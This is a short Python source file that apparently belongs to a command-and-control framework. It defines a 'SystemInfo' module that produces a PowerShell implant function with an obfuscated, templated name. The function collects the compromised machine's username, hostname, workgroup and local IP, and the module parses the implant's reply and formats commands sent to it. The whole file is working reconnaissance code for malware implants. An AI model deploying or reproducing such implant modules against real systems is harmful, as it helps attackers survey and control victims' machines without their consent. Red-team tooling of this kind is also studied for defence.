class SystemInfo:
    type = "SI"
    args = None
    input = "sys_info"
    # this must be unique across ALL implants, any matching keys will be merged causing errors.
    # To safely format this use the following format "<type>_variablename":"value" i.e.
    #   fd_base64_var: base64filecontents
    obfuscation_keypairs = {}

    def process_implant_response(self, data, args):
        split_data = data.decode().split("\n")
        print(split_data)  # This should be a list of 4 items based on the below response.
        # Username: Kris
        # Hostname: DESKTOP - SUMPM3F
        # Domain: WORKGROUP
        # Local IP: 192.168.2.130
        return data.decode(), None

    def implant_text(self):
        var = '''
function {{ ron.obf_collect_sysinfo }}(){
    $h = hostname
    $d = (Get-WmiObject -Class Win32_ComputerSystem).Workgroup
    $a = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address
    $final_str = "Username: "+$env:UserName+"`nHostname: "+$h+"`nDomain: "+$d+"`nLocal IP: "+$a
    $global:tr = $final_str
}'''
        return var

    def pre_process_command(self, argument_string):
        # Check if the argument to be passed to the implant is valid.
        # I.e.
        #    Does the file to be uploaded exist local?
        #    Is the command to be executed dangerous?
        return True

    def create_module_data_string(self, cmd_entry):
        # This function is responsible for creating the string which is send to the implant
        # Format for the implant core string is:
        #   < command type > <command id><optional command arguments>

        return f"{cmd_entry['args']}"